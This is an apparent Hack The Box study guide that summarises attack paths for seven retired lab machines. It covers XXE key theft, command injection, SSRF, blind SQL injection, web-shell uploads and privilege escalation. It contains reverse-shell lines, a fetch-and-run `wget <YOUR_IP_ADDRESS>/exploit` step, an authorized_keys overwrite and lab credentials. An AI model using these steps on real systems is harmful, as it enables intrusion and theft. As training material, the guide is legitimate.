# HTB detailed machine memory guide

> Use this as a reminder checklist, not as a substitute for understanding the technique. Search by protocol, auth mode, function, tool, filename, or AD edge. Each entry links to detailed notes and the official PDF.

> **Independent PDF audit: 3/3 complete.** 71/71 available writeups verified; 58 omitted details integrated and 42 misleading or overly generic items corrected/removed.

## Baseline checks not to skip

These are separate authentication cases. A failure in one does **not** prove the others are disabled.

- **SMB null:** blank user + blank password (`smbclient -L //<target> -N`, `nxc smb <target> -u '' -p ''`).
- **SMB guest:** `guest` + blank password. Check share listing, recursive read, write access, and RPC/RID enumeration independently.
- **RPC/SID:** try `lookupsid`, `rpcclient`, and RID cycling with null, guest, and every low-privilege credential. Save `SidTypeUser` results for spraying.
- **LDAP anonymous:** query RootDSE/naming contexts first, then the base DN. Also try LDAPS and authenticated LDAP; results and controls can differ.
- **Kerberos:** test AS-REP roasting for every valid username and Kerberoasting after obtaining any credential/ticket. Confirm DNS and clock synchronization.
- **MSSQL auth:** distinguish SQL-local (`--local-auth`) from Windows/domain auth. Enumerate roles, impersonation, trustworthy DBs, linked servers, `xp_dirtree`, and `xp_cmdshell`.
- **MSSQL domain discovery:** use `SUSER_SID()` for a known domain principal, remove the final RID for the domain SID, then iterate RIDs with `SUSER_SNAME()` when LDAP/RPC is blocked.
- **SMB files:** inspect SYSVOL/NETLOGON, scripts, XML/GPP `cpassword`, backups, config files, writable shares, and user descriptions/notes.
- **Web:** enumerate TLS SAN names, virtual hosts, directories with relevant extensions, backups, source control, APIs, and alternate HTTP methods.
- **After credentials:** re-test SMB, LDAP, WinRM, MSSQL, Kerberos, BloodHound collection, shares, and password reuse. New authentication changes the visible attack surface.
- **Windows local:** check privileges, groups, services, scheduled tasks, registry/autologon, PowerShell history, browser stores/processes, DPAPI, and writable dependencies.
- **Linux local:** check `sudo -l`, SUID, capabilities, cron/systemd timers, groups, sockets, containers, mounts, credentials, PATH, libraries, and custom binaries.

## 1- Markup

**Target:** Windows · Very Easy

[Detailed notes](./htb-writeups/Markup.md) · [Official PDF](./htb-writeups/Markup.pdf)

### Machine path overview

See the machine-specific user and root paths below.

### Remote enumeration and foothold checks

- Try common/default credentials on the web login; the working pair is exposed by basic guessing rather than a bypass.
- Intercept the Order request and notice that user-controlled fields are serialized as XML; test an external entity against a harmless Windows file before targeting secrets.
- Read the authenticated page source/comments for the name Daniel, then use XXE local-file read against Daniel's Windows profile rather than blindly guessing users.
- Use XXE to retrieve Daniel's private SSH key, preserve its line breaks, chmod it appropriately, and authenticate over SSH.
- Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.
- Intercept XML input and test external-entity local file reads. Use disclosed usernames/source comments to target SSH keys or application configuration instead of guessing paths blindly.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.

### Post-foothold local enumeration and lateral movement

- Enumerate unusual top-level paths on C:, not only user directories; C:\Log-Management contains the relevant automation.
- Read C:\Log-Management\job.bat and identify that it clears event logs with wevtutil under an Administrator context.
- Check ACLs with icacls: BUILTIN\Users has Full Control over job.bat even though Daniel cannot run it directly.
- Confirm periodic execution indirectly with schtasks if allowed, or watch the wevtutil process with PowerShell ps when task listing is denied.
- Transfer a Windows netcat binary to a writable path and prepare a listener before changing the batch file.

### User path

**Memory chain:** default credentials → XXE → source-code review → SSH → private-key discovery

- Attempting a number of default credentials lands us on a successful login. admin:admin administrator:administrator admin:administrator admin:password administrator:password We successfully logged in with admin:password .
- Since we can already navigate the files present on the target system using the XXE vulnerability, let's attempt to navigate to the daniel user's .ssh folder in order to attempt to retrieve their private key.
- The RSA key is printed out in the output, from where it can be placed in a local file on your machine named id_rsa , which you can later use to connect to the target at any point in time.
- Next, copy the RSA key present in the Response in BurpSuite and paste it into the id_rsa file using the text editor of your choice.
- Following this, we can attempt to log in as the daniel user through our SSH client, using his private key.

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`/etc/passwd`, `C:\windows\system32\drivers\etc\hosts`, `win.ini`, `C:\Users\daniel\Desktop`

Open the PDF around page **6** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Overwrite job.bat with the reverse-shell command instead of attempting to execute the protected task yourself.
- Wait for the privileged scheduler to execute the writable batch file and catch the Administrator callback.
- Re-check the exact path spelling (Log-Management versus LogManagement) used by the script and payload.
- Enumerate scheduled jobs/tasks plus every referenced script, binary, working directory, and PATH component. Writable dependencies matter even when the task itself is protected.

### Root / Administrator path

**Memory chain:** reverse shell → cron/scheduled-job abuse → writable script/file abuse

- might be able to get a shell by transferring netcat to the system and modifying the script to execute a reverse shell.
- If our permission level doesn't allow us to view this list through Windows' command line, we can quickly use powershell's ps command instead, which represents another security misconfiguration that works against the server.
- can see that the process wevtutil is running, which is the same process listed in the job.bat file.
- The reverse shell might be slow, in that case, either be patient or quickly read the root flag directly without navigating around the target directories using the following command: type C:\Users\Administrator\Desktop\root.txt The exploit might not work on the first attempt.
- Due to the sensitivity of the exploit, many attempts might lead to failure, in which case the exploit should be run multiple times until it becomes successful.

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`job.bat`, `C:\Log-Management\nc64.exe -e cmd.exe`, `C:\LogManagement\job.bat`, `C:\Users\Administrator\Desktop\root.txt`

Open the PDF around page **8** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 2- Busqueda

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Busqueda.md) · [Official PDF](./htb-writeups/Busqueda.pdf)

### Machine path overview

Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a Python module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to root , we discover credentials within a Git config file, allowing us to log into a local Gitea service. Additionally, we uncover that a system checkup script can be executed with root privileges by a specific user. By utilizing this script, we enumerate Docker containers that reveal credentials for the administrator user's Gitea account. Further analysis of the system checkup script's source code in a Git repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with root privileges.

### Remote enumeration and foothold checks

- Read the site footer: Searchor 2.4.0 is the decisive version clue; compare its code with the 2.4.2 security patch.
- Reproduce Searchor locally and inspect the unsanitized Python eval construction before crafting the payload.
- Break out of the evaluated string/expression with Python __import__('os').system(...) while preserving a valid remainder with concatenation/comment syntax.
- Use the command injection to obtain the initial reverse shell as svc.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Post-foothold local enumeration and lateral movement

- Inspect application source-control metadata locally: /var/www/app/.git/config contains cody's credential and the gitea.searcher.htb hostname.
- Add gitea.searcher.htb to /etc/hosts and test the recovered credential both on SSH and the local Gitea application; protocol access differs by user.
- Browse cody's private Gitea repositories, not just public repos, for the source of the privileged system-checkup script.
- Run sudo -l and enumerate every supported argument of /opt/scripts/system-checkup.py even though the source file itself is unreadable.
- Use docker-ps, then docker-inspect with a Go template such as {{json .}} to expose the Gitea container environment and administrator password.
- Use the administrator Gitea credential to read the scripts repository and recover the exact implementation of full-checkup.

### User path

**Memory chain:** Searchor 2.4.0 source diff → Python eval command injection → shell as svc

- It appears to be a search engine aggregator that allows users to search for information on various search engines.
- Searchor is a comprehensive Python library that streamlines the process of web scraping, retrieving information on any subject, and creating search query URLs.
- obtain a reverse shell on our Netcat listener.

#### Commands and PDF search strings

- `nmap -p$ports -sV 10.10.11.208`
- `wget https://github.com/ArjunSharda/Searchor/archive/refs/tags/v2.4.0.zip`

### Artifacts and exact search anchors

`searcher.htb`, `/etc/hosts`, `main.py`, `v2.4.0.zip`, `/home/svc/user.txt`

Open the PDF around page **5** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Notice that system-checkup.py invokes ./full-checkup.sh with a relative path rather than /opt/scripts/full-checkup.sh.
- Create an executable malicious /tmp/full-checkup.sh, change into /tmp, and invoke the allowed sudo command with the full-checkup argument.
- The working directory controls which relative script root executes; running the sudo command from /opt/scripts would execute the legitimate file.
- Docker is only queried through the allowed system-checkup wrapper to recover the Gitea administrator credential. The actual root boundary is the wrapper invoking cwd-controlled `./full-checkup.sh`; create it in a writable working directory and launch the allowed sudo action from there.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
- Inspect application/service environment variables and readable process environments for secrets, connection strings, internal endpoints, and runtime paths.

### Root / Administrator path

**Memory chain:** .git config cody credential → private Gitea scripts repository → system-checkup docker-inspect Gitea admin secret → cwd-controlled ./full-checkup.sh → root shell

- By enumerating the files on the remote host, we can identify the credential pair cody:jh1usoih2bkjaspwe92 stored in the /var/www/app/.git/config file.
- As we do not possess the password for the administrator user, we are unable to examine the private repositories associated with that user.
- Nonetheless, it is worthwhile to remember to revisit this if we obtain the password later.
- Therefore, we should inspect the system-checkup.py file since we have the ability to execute the /opt/scripts/system-checkup.py file with root privileges on the remote host.
- The root flag can be obtained at /root/root.txt . cat /root/root.txt

#### Commands and PDF search strings

- `ssh svc@10.10.11.208`
- `sudo -l`
- `sudo /usr/bin/python3 /opt/scripts/system-checkup.py *`
- `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps`
- `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect`
- `sudo apt-get -y install jq`
- `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea`
- `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup`

### Artifacts and exact search anchors

`/var/www/app/.git/config`, `gitea.searcher.htb`, `/etc/hosts`, `/usr/bin/python3`, `/opt/scripts/system-checkup.py`, `system-checkup.py`, `/usr/local/sbin`, `/usr/local/bin`, `/usr/sbin`, `/usr/bin`, `/etc/s6`, `/opt/scripts`, `full-checkup.sh`, `/opt/scripts/fullcheckup.sh`, `fullcheckup.sh`, `/opt/scripts/`, `/tmp/full-checkup.sh`, `/tmp/f`, `/root/root.txt`

Open the PDF around page **9** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 3- Sau

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Sau.md) · [Official PDF](./htb-writeups/Sau.pdf)

### Machine path overview

Sau is an Easy Difficulty Linux machine that features a Request Baskets instance that is vulnerable to Server-Side Request Forgery (SSRF) via CVE-2023-27163 . Leveraging the vulnerability we are to gain access to a Maltrail instance that is vulnerable to Unauthenticated OS Command Injection, which allows us to gain a reverse shell on the machine as puma . A sudo misconfiguration is then exploited to gain a root shell.

### Remote enumeration and foothold checks

- Enumerate Request Baskets and identify the version affected by CVE-2023-27163 rather than treating it as a simple request-bin service.
- Create/configure a basket with forward_url pointing to http://127.0.0.1:80 and enable proxy-response behavior so the internal response is returned.
- Use the SSRF basket URL to reach the loopback-only Maltrail instance and fingerprint its version.
- Exploit Maltrail's unauthenticated command injection in the login parameter to obtain a reverse shell as puma.
- Use SSRF to enumerate loopback/internal ports, cloud metadata, and internal HTTP APIs. Compare status, size, and timing when responses are not reflected.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
- Trace user input into shell/eval execution; test separators, quoting, encoding, and blind callbacks. Reproduce the exact server-side string before building a payload.

### Post-foothold local enumeration and lateral movement

- Run sudo -l immediately; puma may execute /usr/bin/systemctl status trail.service as root without a password.
- Check the systemctl version and remember that status opens a pager when output is long enough.
- Use a full-sized terminal or force paging so the less pager is actually invoked.

### User path

**Memory chain:** SSRF → CVE-2023-27163 → reverse shell → command injection → known-vulnerability research

- Port 8338 is also open and filtered, and there is an additional service listening on port 55555 , which responds to HTTP requests.
- This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.
- Since we've discovered the instance is vulnerable and the Nmap scan showed port 80 as filtered, we can use this to check which service runs on the port.
- also enable the following settings: Proxy Response - This allows the basket to behave as a full proxy: responses from the underlying service configured in forward_url are passed back to clients of original requests.
- Foothold We can now leverage this proof of concept from Exploit Database to get a shell on the machine.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.224`
- `curl http://10.10.11.224:55555/2ck6d27`
- `curl -s https://www.exploit-db.com/download/51676 > exploit.py`

### Artifacts and exact search anchors

`CVE-2023-27163`, `exploit.py`, `/home/puma`

Open the PDF around page **6** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Execute the allowed sudo systemctl status command, then escape from less with !sh to inherit the root context.
- Do not waste time modifying the service: the pager escape is the intended boundary break.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.

### Root / Administrator path

**Memory chain:** service abuse → sudo rule abuse → CVE-2023-26604

- Upon checking the sudo permissions for the user puma , we discover that they can run /usr/bin/systemctl status trail.service as root and without a password.
- can leverage this to gain a shell as root . sudo -l Checking the Systemd version running we see it is Systemd 245 .
- To abuse this we find this link that describes the exploitation steps. systemctl --version This coupled with misconfiguration in /etc/sudoers allows for local privilege escalation.
- Since we can run the command as root , the subsequent shell will also belong to the root user.
- First, we execute the below command to check the status of a systemd service named trail.service : sudo /usr/bin/systemctl status trail.service Then, when prompted for the RETURN key, we run !/bin/bash to get a shell as root and read the root flag from /root/ .

#### Commands and PDF search strings

- `sudo -l`
- `sudo /usr/bin/systemctl status trail.service`

### Artifacts and exact search anchors

`/usr/bin/systemctl`, `CVE-2023-26604`, `/etc/sudoers`

Open the PDF around page **7** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 4- Help

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Help.md) · [Official PDF](./htb-writeups/Help.pdf)

### Machine path overview

Help is an Easy Linux box which has a GraphQL endpoint which can be enumerated get a set of credentials for a HelpDesk software. The software is vulnerable to blind SQL injection which can be exploited to get a password for SSH Login. Alternatively an unauthenticated arbitrary file upload can be exploited to get RCE. Then the kernel is found to be vulnerable and can be exploited to get a root shell.

### Remote enumeration and foothold checks

- Enumerate the non-obvious GraphQL endpoint/schema and query user fields to recover HelpDesk credentials; do not limit web testing to visible routes.
- Fingerprint the HelpDeskZ version and inspect both its login logic and upload workflow.
- For the SQLi route, manually exploit the blind condition to extract the staff password hash character by character, crack it, and test SSH reuse.
- For the alternate route, exploit unauthenticated attachment upload and calculate/predict the server-side filename from the upload timestamp before requesting the PHP payload.
- Keep the two foothold routes separate: blind SQLi yields an SSH password, while upload prediction yields direct web RCE.
- For the alternate HelpDeskZ upload route, synchronize the exploit's local timestamp/timezone with the server time shown in the HTTP response; otherwise the MD5-derived uploaded filename prediction can miss.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Test upload validation separately for extension, MIME, magic bytes, filename/path, and post-upload execution. Determine the exact storage path and whether timing/name prediction is involved.
- Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.

### Post-foothold local enumeration and lateral movement

- After obtaining the help shell/SSH session, record the exact Ubuntu kernel build with uname rather than relying only on the distribution version.
- Search for a local privilege-escalation exploit matching that kernel and architecture, then compile it in a compatible environment if needed.
- Stabilize the initial shell before transferring/compiling the kernel exploit.

### User path

**Memory chain:** HelpDeskZ enumeration → SQL injection → file upload abuse → timestamp prediction → reverse shell

- Now we can try dumping the password too. curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username, password} }' | jq And we get the password.
- An example ticket is, http://help.htb/support/? v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 Let's check if it’s vulnerable to SQLI, http://help.htb/support/? v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 and 1=1-- Sending this results in a true condition which returns the image but changing it to 1=2 doesn’t because it evaluates to false.
- The password is stored as a SHA1 hash which a 40 characters long.
- For this, we can use the substr() function which will loop character by character. http://help.htb/support/? v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 and substr((select password from staff limit 0,1),1,1) = 'd'-- - It returns the attachment and confirms that the hash starts with d.
- The username needs to be guessed which is “help”. ssh help@10.10.10.121 # password: Welcome1 ALTERNATE METHOD Earlier we found the HelpDesk version to be vulnerable to arbitrary file upload too.

#### Commands and PDF search strings

- `nmap -p$ports -sV 10.10.10.121`
- `gobuster dir -w directory-list-2.3-medium.txt -t 100 -u http://help.htb/`
- `Gobuster straight away discovers /support going to which we find a HelpDeskz installation.`
- `curl -s -G http://10.10.10.121:3000/graphql --data-urlencode "query={user}" | jq`
- `curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username} }' |`
- `curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username,`
- `ssh help@10.10.10.121 # password: Welcome1`

### Artifacts and exact search anchors

`help.htb`, `/etc/hosts`, `/usr/bin/python`, `brute.py`, `submit_ticket_controller.php`, `40300.py`, `php-reverse-shell.php`

Open the PDF around page **7** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Use the matching kernel vulnerability (the writeup's kernel exploit) locally to transition from help to root.
- Verify architecture, compiler availability, and exploit prerequisites before execution; a generic newest-kernel exploit is not interchangeable.

### Root / Administrator path

**Memory chain:** kernel version enumeration → kernel exploit → root shell

- On enumerating the box the kernel version is found to be 4.4.0-116-generic.
- A google search results in a kernel exploit for the version.
- Download the exploit and compile it locally. gcc exploit.c -o exploit Start a simple http server and transfer it to the box then execute it. python3 -m http.server 80 # Locally cd• /tmp wget <YOUR_IP_ADDRESS>/exploit chmod +x exploit ./exploit The exploit directly results in a root shell.

#### Commands and PDF search strings

- `wget <YOUR_IP_ADDRESS>/exploit`

### Artifacts and exact search anchors

No stable artifact was extracted automatically; use the decision checks and commands.

Open the PDF around page **12** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 5- Broker

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Broker.md) · [Official PDF](./htb-writeups/Broker.pdf)

### Machine path overview

Broker is an easy difficulty Linux machine hosting a version of Apache ActiveMQ . Enumerating the version of Apache ActiveMQ shows that it is vulnerable to Unauthenticated Remote Code Execution , which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a sudo misconfiguration allowing the activemq user to execute sudo /usr/sbin/nginx , which is similar to the recent Zimbra disclosure and is leveraged to gain root access.

### Remote enumeration and foothold checks

- Host a malicious Spring XML bean definition and use the OpenWire deserialization/RCE path to make ActiveMQ fetch it.
- Use the XML bean to execute a staged command and obtain the activemq shell.
- Treat the ActiveMQ OpenWire RCE as CVE-2023-46604. The single CVE-2023-46606 reference in the copied prose is a typo; do not look for a second exploit to chain.
- Identify the exact serialization format, signing/encryption boundary, and gadget environment before generating a payload; source review often reveals the required class/library.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Post-foothold local enumeration and lateral movement

- Run sudo -l: activemq can start /usr/sbin/nginx with an attacker-controlled configuration as root.
- Confirm the installed Nginx modules support WebDAV PUT (ngx_http_dav_module).
- Build a minimal Nginx config that runs as root, listens on a chosen loopback port, maps the document root to /, and allows PUT with create_full_put_path.
- Launch sudo nginx -c <config> and verify the new listener with ss -tlpn before attempting the write.
- Generate a dedicated SSH keypair and ensure the destination /root/.ssh path exists/is addressable through the configured DAV root.

### User path

**Memory chain:** ActiveMQ version fingerprint → CVE-2023-46604 OpenWire RCE → malicious Spring XML → shell as activemq

- Apache ActiveMQ Exploitation Searching for vulnerabilities in this version of ActiveMQ shows that it is vulnerable to a deserialisation vulnerability labelled CVE-2023-46604; more information can be found here.
- Deserialisation Process: ActiveMQ processes incoming data that should represent an error ( Throwable class) during its communication protocol.
- Foothold Searching on Google for CVE-2023-46604 exploit github reveals this link which has a Proof of Concept code for how to exploit it.
- The PoC Golang script leveraged the deserialisation vulnerability to instantiate the class org.springframework.context.support.ClassPathXmlApplicationContext , which allows the configuration of a Spring application via a (remote) XML file: in this case, our malicious XML file that sent a reverse shell to our listener.
- The user flag can be found at /home/activemq/user.txt .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.129.230.87`
- `wget https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-ApacheActiveMQ/archive/refs/heads/main.zip`

### Artifacts and exact search anchors

`CVE-2023-46604`, `main.zip`, `poc-linux.xml`, `/home/activemq/user.txt`

Open the PDF around page **2** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- PUT the public key through the root-run Nginx listener into /root/.ssh/authorized_keys.
- SSH to root@localhost with the matching private key; this avoids fragile shared-library/log poisoning alternatives.
- If PUT fails, re-check DAV methods, URL-to-filesystem mapping, Nginx worker user, directory creation, and file permissions.
- Use the sudo-controlled Nginx configuration to expose a root-run WebDAV listener, PUT a public key into `/root/.ssh/authorized_keys`, and SSH as root. Shared-library or log poisoning is only an unused alternative.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.

### Root / Administrator path

**Memory chain:** sudo Nginx with attacker config → root-run WebDAV listener → PUT /root/.ssh/authorized_keys → SSH as root

- There are a few different approaches one could take at this point to leverage this configuration to obtain root privileges, such as the method disclosed in this Zimbra article back in 2021, which involved writing a log file into a shared object library loaded by sudo .
- However, we opt for a much simpler route: we will use the ngx_http_dav_module to write our public SSH key into the root user's authorized_keys file.
- create the keypair as follows: activemq@broker:/tmp$ ssh-keygen Generating public/private rsa key pair.
- Having set the document root to / , we specify the full path /root/.ssh/authorized_keys and use the -d flag to set the contents of the written file to our public key. curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)" The request goes through without errors.
- can now ssh into the machine as the root user: activemq@broker:/tmp$ ssh -i root root@localhost Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64) <...SNIP...> Last login: Thu Nov 9 09:08:52 2023 from 10.10.14.40 root@broker:~# id uid=0(root) gid=0(root) groups=0(root) The root flag can be found at /root/root.txt .

#### Commands and PDF search strings

- `sudo nginx -c /tmp/pwn.conf`
- `curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"`

### Artifacts and exact search anchors

`/tmp/nginx.pid`, `/tmp/pwn.conf`, `pwn.conf`, `/root/.ssh/authorized_keys`, `/home/activemq/.ssh/id_rsa`, `/root/root.txt`

Open the PDF around page **4** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 6- Soccer

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Soccer.md) · [Official PDF](./htb-writeups/Soccer.pdf)

### Machine path overview

Soccer is an easy difficulty Linux machine that features a foothold based on default credentials, forfeiting access to a vulnerable version of the Tiny File Manager , which in turn leads to a reverse shell on the target system ( CVE-2021-45010 ). Enumerating the target reveals a subdomain which is vulnerable to a blind SQL injection through websockets. Leveraging the SQLi leads to dumped SSH credentials for the player user, who can run dstat using doas - an alternative to sudo . By creating a custom Python plugin for doas , a shell as root is then spawned through the SUID bit of the doas binary, leading to fully escalated privileges.

### Remote enumeration and foothold checks

- Discover the Tiny File Manager path and try its documented/default admin credential admin:admin@123.
- Use the writable uploads directory to place a PHP web shell and obtain the www-data foothold.
- After landing, inspect web-server/vhost configuration and /etc/hosts-style clues for the second site soc-player.soccer.htb; add it locally and enumerate it.
- Observe that the second application sends search/login data over WebSockets; proxy or script the WebSocket traffic rather than testing only normal HTTP parameters.
- Confirm blind SQL injection through boolean WebSocket responses, then automate/dump the account table to recover player SSH credentials.
- For the WebSocket SQL injection, use `sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id": "*"}' --level 5 --risk 3 --batch --dump`; the copied `-level`/`-dump` spellings are typos and require two leading hyphens.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- After obtaining a Linux shell, inspect Nginx configuration with `nginx -T` when permitted and read `/etc/nginx/nginx.conf`, `sites-enabled/*`, `sites-available/*`, and included `conf.d/*`. Record every `server_name`, `listen`, `root`, `alias`, `proxy_pass`, credential, and localhost-only vhost; resolve/tunnel each newly discovered site and enumerate it separately.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
- Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.

### Post-foothold local enumeration and lateral movement

- Authenticate over SSH as player with the database credential and enumerate nonstandard SUID files and doas configuration.
- Notice /usr/bin/doas is SUID and read /usr/local/etc/doas.conf to identify that player may run dstat as root.
- Run dstat --list and identify plugin search directories writable by player.

### User path

**Memory chain:** Tiny File Manager default admin → PHP upload shell → Nginx sites-enabled hidden vhost → soc-player.soccer.htb WebSocket → blind SQL injection → SSH as player

- run a directory scan using gobuster to find any potentially interesting files. gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3medium.txt Our enumeration yields a /tiny directory, which when navigated to shows a login panel to a file manager.
- A search for the keywords tiny file manager reveals a GitHub repository, which in turn divulges the default administrative credentials for the service, namely admin:admin@123 .
- log in successfully and land on the file manager's dashboard, which also reveals the service's version, namely 2.4.3 .
- As a quick search reveals, Tiny File Manager <= 2.4.6 allows remote attackers with valid user accounts to upload malicious PHP files to the webroot and achieve code execution on the target server, which is also known as CVE-2021-45010 .
- fire up a listener on port 4444 and can trigger the reverse shell by navigating to /tiny/uploads/shell.php . nc -nlvp 4444 We successfully get a shell as www-data .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.11.194`
- `gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3medium.txt`
- `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch`
- `sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D`

### Artifacts and exact search anchors

`soccer.htb`, `/etc/hosts`, `/usr/share/wordlists/dirbuster/directory-list-2.3medium.txt`, `CVE-2021-45010`, `shell.php`, `soc-player.soccer.htb`, `/home/player/user.txt`

Open the PDF around page **6** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Create a malicious Python dstat plugin in the writable plugin directory with the required dstat_<name>.py naming.
- Invoke doas /usr/bin/dstat --<name> so root imports and executes the plugin.
- Do not treat doas like unrestricted sudo; the exploit depends specifically on dstat's plugin loading.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
- Check `/etc/doas.conf` in addition to `sudo -l`; note the exact permitted command, arguments, environment, and plugin/config paths it trusts.

### Root / Administrator path

**Memory chain:** SUID doas → /usr/local/etc/doas.conf → root dstat rule → writable dstat plugin → root shell

- However, it also presents a potential security vulnerability because it allows attackers to escalate their privileges on a system by exploiting SUID executables.
- Taking a look at its manual shows a handful of interesting information, most importantly revealing the possibility of using Python plugins for the tool. man dstat If we can execute Python code as the root user, we could spawn a shell with the elevated privileges intact.
- Although dstat plugins can only be hosted in certain directories, we have write access to one of them, which is /usr/local/share/dstat .
- This means that we can potentially exploit this access to execute arbitrary code as the root user.
- The final flag can be found at /root/root.txt .

#### Commands and PDF search strings

- `find / -type f -perm -4000 2>/dev/null`

### Artifacts and exact search anchors

`/usr/bin/doas`, `/usr/local/etc/doas.conf`, `doas.conf`, `/usr/local/share/dstat`, `/usr/local/share/dstat/dstat_pwn.py`, `dstat_pwn.py`, `/usr/bin/dstat`, `/root/root.txt`

Open the PDF around page **11** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 7- Keeper

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Keeper.md) · [Official PDF](./htb-writeups/Keeper.pdf)

### Machine path overview

Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access. With SSH access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the Keepass database, we can access the root SSH keys, which are used to gain a privileged shell on the host.

### Remote enumeration and foothold checks

- Resolve the tickets.keeper.htb vhost and identify Request Tracker rather than only attacking the default Nginx page.
- Try Request Tracker's documented default root:password credential.
- Read user profiles and support-ticket content after login; lnorgaard's cleartext password is in the application data, not obtained by cracking.
- Reuse the recovered lnorgaard credential over SSH.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.

### Post-foothold local enumeration and lateral movement

- Enumerate lnorgaard's home directory for the KeePass artifacts: the .kdbx database and KeePass process-memory dump.
- Recognize CVE-2023-32784 applies to the memory dump and run the KeePass password dumper against it.
- The dumper output is incomplete/ambiguous; search the recovered phrase fragments to reconstruct the accented master password rather than using the raw output literally.
- Open the KeePass database and inspect every entry/attachment, especially the Network entry containing a PuTTY-formatted root key.
